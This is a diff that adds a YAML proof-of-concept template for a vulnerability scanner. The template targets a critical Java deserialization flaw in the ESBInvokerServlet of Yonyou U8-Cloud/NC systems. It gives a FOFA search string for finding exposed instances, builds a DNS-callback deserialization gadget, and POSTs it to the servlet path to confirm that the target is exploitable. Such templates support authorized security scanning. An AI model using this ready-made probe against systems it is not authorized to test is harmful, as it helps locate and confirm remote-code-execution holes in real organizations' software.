@@ -1,0 +1,20 @@
+id: poc-yaml-yongyou-esbinvokerservlet-deserialization-rce
+info:
+  name: 用友u8-cloud系统ESBInvokerServlet存在反序列化漏洞
+  severity: critical
+  tags:
+  - DNSLOG
+  - 两高一弱
+  - 反序列化
+  finger: 用友-NC-Cloud
+  fofa: app="用友-UFIDA-NC"
+variables:
+  reverse: new_dns_log()
+  reverseDomain: reverse.Domain()
+  t1: java_dns_url_gadget("http://"+reverseDomain,"raw")
+requests:
+- method: POST
+  path: /servlet/ESBInvokerServlet
+  data: '{{.t1}}'
+  expression: reverse.Verify()
+transport: http
